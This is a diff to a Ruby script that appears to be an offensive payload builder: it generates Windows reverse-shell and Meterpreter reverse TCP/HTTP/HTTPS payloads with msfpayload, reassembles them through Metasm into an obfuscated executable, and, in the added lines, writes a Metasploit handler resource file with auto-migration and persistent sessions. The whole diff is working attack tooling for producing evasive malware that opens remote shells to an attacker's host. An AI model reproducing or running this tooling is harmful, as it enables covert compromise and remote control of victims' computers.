@@ -92,13 +92,13 @@ end
 #Making raw payload or getting the file
 case PAYLOAD
   when "1"
-  %x{msfpayload windows/shell/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
+  payload_name = "windows/shell/reverse_tcp"
   when "2"
-  %x{msfpayload windows/meterpreter/reverse_tcp LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
+  payload_name = "windows/meterpreter/reverse_tcp"
   when "3"
-  %x{msfpayload windows/meterpreter/reverse_https LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
+  payload_name = "windows/meterpreter/reverse_https"
   when "4"
-  %x{msfpayload windows/meterpreter/reverse_http LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
+  payload_name = "windows/meterpreter/reverse_http"
   when "5"
   puts "Enter filename."
   user_file = gets.chomp
@@ -122,6 +122,20 @@ case PAYLOAD
   exitrandom
 end
 unless payload_num == 6
+  #Making payload
+  %x{msfpayload #{payload_name} LHOST=#{LHOST} LPORT=#{LPORT} R > #{raw_file}}
+  #Making the rc file
+  rc = File.new("obfy.rc", "w+")
+  rc.puts "use exploit/multi/handler"
+  rc.puts "set payload #{payload_name}"
+  rc.puts "set LHOST #{LHOST}"
+  rc.puts "set LPORT #{LPORT}"
+  rc.puts "set SessionCommunicationTimeout 600"
+  rc.puts "set ExitOnSession false"
+  rc.puts "set InitialAutoRunScript migrate -f"
+  rc.puts "set PrependMigrate true"
+  rc.puts "exploit -j -z"
+  rc.close
   #Converting it to the asm code
   raw = File.open(raw_file, 'rb')
   exefmt =  AutoExe.orshellcode { Metasm.const_get('Ia32').new }
@@ -156,7 +170,7 @@ unless payload_num == 6
   src = File.read(asm_ghost)
   exe = Metasm::PE.assemble(Metasm::Ia32.new, src, asm_ghost)
   exe.encode_file(exe_file, :bin)
-  puts "#{exe_file} was created, payload #=#{PAYLOAD}, LHOST=#{LHOST}, and LPORT=#{LPORT}"
+  puts "#{exe_file} was created, payload =#{payload_name}, LHOST=#{LHOST}, and LPORT=#{LPORT}"
   #Cleaning up
   File.delete(asm_ghost) if File.file?(asm_ghost)
   File.delete(raw_file) if File.file?(raw_file)
